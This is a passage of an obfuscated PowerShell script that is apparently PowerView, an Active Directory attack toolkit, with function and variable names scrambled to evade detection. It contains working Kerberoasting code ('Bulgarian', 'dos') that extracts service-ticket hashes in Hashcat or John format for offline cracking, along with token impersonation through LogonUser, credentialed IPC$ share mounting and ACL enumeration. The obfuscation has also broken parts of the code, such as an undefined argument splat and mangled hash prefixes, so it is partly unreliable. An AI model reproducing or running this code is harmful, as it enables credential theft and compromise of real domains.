                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        spokesmen -soGjewdO99 $vUyIbYgw99 @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[dotcom] Error converting SID '$vUyIbYgw99' : $_"
            }
        }
    }
}
function spokesmen {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $soGjewdO99,
        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $LkQAjVeR99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $nZYFELBl99 = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }
        function Invoke-Method([__ComObject] $Object, [String] $fQOJfqWf99, $aKQQJBOI99) {
            $MZchCEdW99 = $Null
            $MZchCEdW99 = $Object.GetType().InvokeMember($fQOJfqWf99, 'InvokeMethod', $NULL, $Object, $aKQQJBOI99)
            Write-Output $MZchCEdW99
        }
        function Get-Property([__ComObject] $Object, [String] $GUKsRxhR99) {
            $Object.GetType().InvokeMember($GUKsRxhR99, 'GetProperty', $NULL, $Object, $NULL)
        }
        function Set-Property([__ComObject] $Object, [String] $GUKsRxhR99, $aKQQJBOI99) {
            [Void] $Object.GetType().InvokeMember($GUKsRxhR99, 'SetProperty', $NULL, $Object, $aKQQJBOI99)
        }
        if ($PSBoundParameters['Server']) {
            $bzhTufzA99 = 2
            $ajrMxKHx99 = $YBAlGqrU99
        }
        elseif ($PSBoundParameters['Domain']) {
            $bzhTufzA99 = 1
            $ajrMxKHx99 = $UtXBFQsM99
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $fxunRYJT99.GetNetworkCredential()
            $bzhTufzA99 = 1
            $ajrMxKHx99 = $Cred.Domain
        }
        else {
            $bzhTufzA99 = 3
            $ajrMxKHx99 = $Null
        }
    }
    PROCESS {
        ForEach ($HtwdQimx99 in $soGjewdO99) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($HtwdQimx99 -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $WbuIKubG99 = $nZYFELBl99['DomainSimple']
                }
                else {
                    $WbuIKubG99 = $nZYFELBl99['NT4']
                }
            }
            else {
                $WbuIKubG99 = $nZYFELBl99[$LkQAjVeR99]
            }
            $lESxnylK99 = New-Object -ComObject NameTranslate
            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $fxunRYJT99.GetNetworkCredential()
                    Invoke-Method $lESxnylK99 'InitEx' (
                        $bzhTufzA99,
                        $ajrMxKHx99,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[spokesmen] Error initializing translation for '$soGjewdO99' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $lESxnylK99 'Init' (
                        $bzhTufzA99,
                        $ajrMxKHx99
                    )
                }
                catch {
                    Write-Verbose "[spokesmen] Error initializing translation for '$soGjewdO99' : $_"
                }
            }
            Set-Property $lESxnylK99 'ChaseReferral' (0x60)
            try {
                $Null = Invoke-Method $lESxnylK99 'Set' (8, $HtwdQimx99)
                Invoke-Method $lESxnylK99 'Get' ($WbuIKubG99)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[spokesmen] Error translating '$HtwdQimx99' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}
function persuades {
    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,
        [Switch]
        $JyVCApoo99
    )
    BEGIN {
        $LokBspQf99 = New-Object System.Collections.Specialized.OrderedDictionary
        $LokBspQf99.Add("SCRIPT", 1)
        $LokBspQf99.Add("ACCOUNTDISABLE", 2)
        $LokBspQf99.Add("HOMEDIR_REQUIRED", 8)
        $LokBspQf99.Add("LOCKOUT", 16)
        $LokBspQf99.Add("PASSWD_NOTREQD", 32)
        $LokBspQf99.Add("PASSWD_CANT_CHANGE", 64)
        $LokBspQf99.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $LokBspQf99.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $LokBspQf99.Add("NORMAL_ACCOUNT", 512)
        $LokBspQf99.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $LokBspQf99.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $LokBspQf99.Add("SERVER_TRUST_ACCOUNT", 8192)
        $LokBspQf99.Add("DONT_EXPIRE_PASSWORD", 65536)
        $LokBspQf99.Add("MNS_LOGON_ACCOUNT", 131072)
        $LokBspQf99.Add("SMARTCARD_REQUIRED", 262144)
        $LokBspQf99.Add("TRUSTED_FOR_DELEGATION", 524288)
        $LokBspQf99.Add("NOT_DELEGATED", 1048576)
        $LokBspQf99.Add("USE_DES_KEY_ONLY", 2097152)
        $LokBspQf99.Add("DONT_REQ_PREAUTH", 4194304)
        $LokBspQf99.Add("PASSWORD_EXPIRED", 8388608)
        $LokBspQf99.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $LokBspQf99.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }
    PROCESS {
        $zlXXOMDB99 = New-Object System.Collections.Specialized.OrderedDictionary
        if ($JyVCApoo99) {
            ForEach ($hwVZUotr99 in $LokBspQf99.GetEnumerator()) {
                if ( ($Value -band $hwVZUotr99.Value) -eq $hwVZUotr99.Value) {
                    $zlXXOMDB99.Add($hwVZUotr99.Name, "$($hwVZUotr99.Value)+")
                }
                else {
                    $zlXXOMDB99.Add($hwVZUotr99.Name, "$($hwVZUotr99.Value)")
                }
            }
        }
        else {
            ForEach ($hwVZUotr99 in $LokBspQf99.GetEnumerator()) {
                if ( ($Value -band $hwVZUotr99.Value) -eq $hwVZUotr99.Value) {
                    $zlXXOMDB99.Add($hwVZUotr99.Name, "$($hwVZUotr99.Value)")
                }
            }
        }
        $zlXXOMDB99
    }
}
function ethnologist {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    try {
        if ($PSBoundParameters['Domain'] -or ($soGjewdO99 -match '.+\\.+')) {
            if ($soGjewdO99 -match '.+\\.+') {
                $HOneBgIN99 = $soGjewdO99 | spokesmen -LkQAjVeR99 Canonical
                if ($HOneBgIN99) {
                    $eqXMikTI99 = $HOneBgIN99.SubString(0, $HOneBgIN99.IndexOf('/'))
                    $jUkZsxCM99 = $soGjewdO99.Split('\')[1]
                    Write-Verbose "[ethnologist] Binding to domain '$eqXMikTI99'"
                }
            }
            else {
                $jUkZsxCM99 = $soGjewdO99
                Write-Verbose "[ethnologist] Binding to domain '$UtXBFQsM99'"
                $eqXMikTI99 = $UtXBFQsM99
            }
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[ethnologist] Using alternate credentials'
                $oHCkmxws99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $eqXMikTI99, $fxunRYJT99.UserName, $fxunRYJT99.GetNetworkCredential().Password)
            }
            else {
                $oHCkmxws99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $eqXMikTI99)
            }
        }
        else {
            if ($PSBoundParameters['Credential']) {
                Write-Verbose '[ethnologist] Using alternate credentials'
                $dhAGSxEC99 = manège | Select-Object -ExpandProperty Name
                $oHCkmxws99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain, $dhAGSxEC99, $fxunRYJT99.UserName, $fxunRYJT99.GetNetworkCredential().Password)
            }
            else {
                $oHCkmxws99 = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain)
            }
            $jUkZsxCM99 = $soGjewdO99
        }
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'Context' $oHCkmxws99
        $Out | Add-Member Noteproperty 'Identity' $jUkZsxCM99
        $Out
    }
    catch {
        Write-Warning "[ethnologist] Error creating binding for object ('$soGjewdO99') context : $_"
    }
}
function Staci {
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path,
        [Parameter(Mandatory = $True)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99
    )
    BEGIN {
        $jJvMiAEf99 = [Activator]::CreateInstance($ApuIAuqW99)
        $jJvMiAEf99.dwType = 1
    }
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($RkkOlRkn99 in $FRrsCtDf99) {
                $RkkOlRkn99 = $RkkOlRkn99.Trim('\')
                $Paths += ,"\\$RkkOlRkn99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($JetVKPlT99 in $Paths) {
            $jJvMiAEf99.lpRemoteName = $JetVKPlT99
            Write-Verbose "[Staci] Attempting to mount: $JetVKPlT99"
            $kTrwYNCb99 = $Mpr::WNetAddConnection2W($jJvMiAEf99, $fxunRYJT99.GetNetworkCredential().Password, $fxunRYJT99.UserName, 4)
            if ($kTrwYNCb99 -eq 0) {
                Write-Verbose "$JetVKPlT99 successfully mounted"
            }
            else {
                Throw "[Staci] error mounting $JetVKPlT99 : $(([ComponentModel.Win32Exception]$kTrwYNCb99).Message)"
            }
        }
    }
}
function outsmarts {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ComputerName', ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $FRrsCtDf99,
        [Parameter(Position = 0, ParameterSetName = 'Path', Mandatory = $True)]
        [ValidatePattern('\\\\.*\\.*')]
        [String[]]
        $Path
    )
    PROCESS {
        $Paths = @()
        if ($PSBoundParameters['ComputerName']) {
            ForEach ($RkkOlRkn99 in $FRrsCtDf99) {
                $RkkOlRkn99 = $RkkOlRkn99.Trim('\')
                $Paths += ,"\\$RkkOlRkn99\IPC$"
            }
        }
        else {
            $Paths += ,$Path
        }
        ForEach ($JetVKPlT99 in $Paths) {
            Write-Verbose "[outsmarts] Attempting to unmount: $JetVKPlT99"
            $kTrwYNCb99 = $Mpr::WNetCancelConnection2($JetVKPlT99, 0, $True)
            if ($kTrwYNCb99 -eq 0) {
                Write-Verbose "$JetVKPlT99 successfully ummounted"
            }
            else {
                Throw "[outsmarts] error unmounting $JetVKPlT99 : $(([ComponentModel.Win32Exception]$kTrwYNCb99).Message)"
            }
        }
    }
}
function departs {
    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99,
        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TtWrEMPZ99,
        [Switch]
        $Quiet
    )
    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
        Write-Warning "[departs] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }
    if ($PSBoundParameters['TokenHandle']) {
        $vyEWShBc99 = $TtWrEMPZ99
    }
    else {
        $vyEWShBc99 = [IntPtr]::Zero
        $sCuYSvdh99 = $fxunRYJT99.GetNetworkCredential()
        $NzTnTiPA99 = $sCuYSvdh99.Domain
        $pgSynGHL99 = $sCuYSvdh99.UserName
        Write-Warning "[departs] Executing LogonUser() with user: $($NzTnTiPA99)\$($pgSynGHL99)"
        $kTrwYNCb99 = $ZCzUrYZa99::LogonUser($pgSynGHL99, $NzTnTiPA99, $sCuYSvdh99.Password, 9, 3, [ref]$vyEWShBc99);$STRNLQhd99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
        if (-not $kTrwYNCb99) {
            throw "[departs] LogonUser() Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
        }
    }
    $kTrwYNCb99 = $ZCzUrYZa99::ImpersonateLoggedOnUser($vyEWShBc99)
    if (-not $kTrwYNCb99) {
        throw "[departs] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
    }
    Write-Verbose "[departs] Alternate credentials successfully impersonated"
    $vyEWShBc99
}
function lithe {
    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TtWrEMPZ99
    )
    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[lithe] Reverting token impersonation and closing LogonUser() token handle"
        $kTrwYNCb99 = $Kernel32::CloseHandle($TtWrEMPZ99)
    }
    $kTrwYNCb99 = $ZCzUrYZa99::RevertToSelf();$STRNLQhd99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
    if (-not $kTrwYNCb99) {
        throw "[lithe] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $STRNLQhd99).Message)"
    }
    Write-Verbose "[lithe] Token impersonation successfully reverted"
}
function Bulgarian {
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,
        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $HGSWmlGw99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        if ($PSBoundParameters['User']) {
            $pbpXWNuB99 = $User
        }
        else {
            $pbpXWNuB99 = $SPN
        }
        ForEach ($Object in $pbpXWNuB99) {
            if ($PSBoundParameters['User']) {
                $GJbfBNaI99 = $Object.ServicePrincipalName
                $kUBgsWrg99 = $Object.SamAccountName
                $ItxiPUio99 = $Object.DistinguishedName
            }
            else {
                $GJbfBNaI99 = $Object
                $kUBgsWrg99 = 'UNKNOWN'
                $ItxiPUio99 = 'UNKNOWN'
            }
            if ($GJbfBNaI99 -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $GJbfBNaI99 = $GJbfBNaI99[0]
            }
            try {
                $vJYOfwgy99 = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $GJbfBNaI99
            }
            catch {
                Write-Warning "[Bulgarian] Error requesting ticket for SPN '$GJbfBNaI99' from user '$ItxiPUio99' : $_"
            }
            if ($vJYOfwgy99) {
                $YeNgszBu99 = $vJYOfwgy99.GetRequest()
            }
            if ($YeNgszBu99) {
                $Out = New-Object PSObject
                $JMLLRyyI99 = [System.BitConverter]::ToString($YeNgszBu99) -replace '-'
                $Out | Add-Member Noteproperty 'SamAccountName' $kUBgsWrg99
                $Out | Add-Member Noteproperty 'DistinguishedName' $ItxiPUio99
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $vJYOfwgy99.ServicePrincipalName
                if($JMLLRyyI99 -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $LUkoryGg99 = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $gFMZKNvR99 = $Matches.DataToEnd.Substring(0,$LUkoryGg99*2)
                    if($Matches.DataToEnd.Substring($LUkoryGg99*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($vJYOfwgy99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($YeNgszBu99).Replace('-',''))
                    } else {
                        $Hash = "$($gFMZKNvR99.Substring(0,32))`$$($gFMZKNvR99.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($vJYOfwgy99.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($YeNgszBu99).Replace('-',''))
                }
                if($Hash) {
                    if ($HGSWmlGw99 -match 'John') {
                        $DjJYkGgQ99 = "`$mrJhkEKN99`$$($vJYOfwgy99.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($ItxiPUio99 -ne 'UNKNOWN') {
                            $NzTnTiPA99 = $ItxiPUio99.SubString($ItxiPUio99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $NzTnTiPA99 = 'UNKNOWN'
                        }
                        $DjJYkGgQ99 = "`$mrJhkEKN99`$$($Etype)`$*$kUBgsWrg99`$$NzTnTiPA99`$$($vJYOfwgy99.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $DjJYkGgQ99
                }
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function dos {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $HGSWmlGw99 = 'Hashcat',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $obYNFcTp99 = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $obYNFcTp99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $obYNFcTp99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $obYNFcTp99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $obYNFcTp99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $obYNFcTp99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $obYNFcTp99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $obYNFcTp99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $obYNFcTp99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $obYNFcTp99['Credential'] = $fxunRYJT99 }
        if ($PSBoundParameters['Credential']) {
            $nGIhjdzZ99 = departs -fxunRYJT99 $fxunRYJT99
        }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $obYNFcTp99['Identity'] = $soGjewdO99 }
        threatened @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Bulgarian -HGSWmlGw99 $HGSWmlGw99
    }
    END {
        if ($nGIhjdzZ99) {
            lithe -TtWrEMPZ99 $nGIhjdzZ99
        }
    }
}
function epithets {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        function piranhas {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )
            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }
            $DUyXCPSr99 = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }
            $ARHbOQzG99 = @()
            $ARHbOQzG99 += $DUyXCPSr99.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $DUyXCPSr99[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $ARHbOQzG99 += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($ARHbOQzG99 | Where-Object {$_}) -join ','
        }
        $LZxUZArx99 = @{}
        if ($PSBoundParameters['Credential']) { $LZxUZArx99['Credential'] = $fxunRYJT99 }
        $FfETXugp99 = @{}
    }
    PROCESS {
        ForEach ($JetVKPlT99 in $Path) {
            try {
                if (($JetVKPlT99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $eNGCfBcN99 = (New-Object System.Uri($JetVKPlT99)).Host
                    if (-not $FfETXugp99[$eNGCfBcN99]) {
                        Staci -FRrsCtDf99 $eNGCfBcN99 -fxunRYJT99 $fxunRYJT99
                        $FfETXugp99[$eNGCfBcN99] = $True
                    }
                }
                $ACL = Get-Acl -Path $JetVKPlT99
                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = dotcom -ObjectSID $SID @ConvertArguments
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $JetVKPlT99
                    $Out | Add-Member Noteproperty 'FileSystemRights' (piranhas -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                Write-Verbose "[epithets] error: $_"
            }
        }
    }
    END {
        $FfETXugp99.Keys | outsmarts
    }
}
function Johnson {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $rtPnFfWd99
    )
    $ZQDzJlKJ99 = @{}
    $rtPnFfWd99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
